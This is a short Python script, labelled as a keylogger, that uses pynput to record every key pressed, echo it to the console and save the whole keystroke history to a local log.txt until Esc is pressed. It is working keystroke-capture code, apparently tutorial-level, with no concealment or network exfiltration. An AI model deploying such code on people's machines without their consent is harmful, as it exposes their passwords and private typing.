# keylogger using pynput module
 
from pynput.keyboard import Key, Listener
 
keys = [] # empty list to add the keystrokes
 
# function to print which key is being pressed
def on_press(key):
    keys.append(key)
    write_file(keys)
 
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
 
    except AttributeError:
        print('special key {0} pressed'.format(key))
 
# function to write the keystrokes to the log file
def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            # removing '' of the strings
            k = str(key).replace("'", "")
            f.write(k)
            # space between every keystroke for readability
            f.write(' ')
 
# function to print which key is being released and end Listener if esc is pressed
def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener when esc is pressed
        return False
 
 
with Listener(on_press=on_press,
              on_release=on_release) as listener:
    listener.join() # joins all the keystrokes together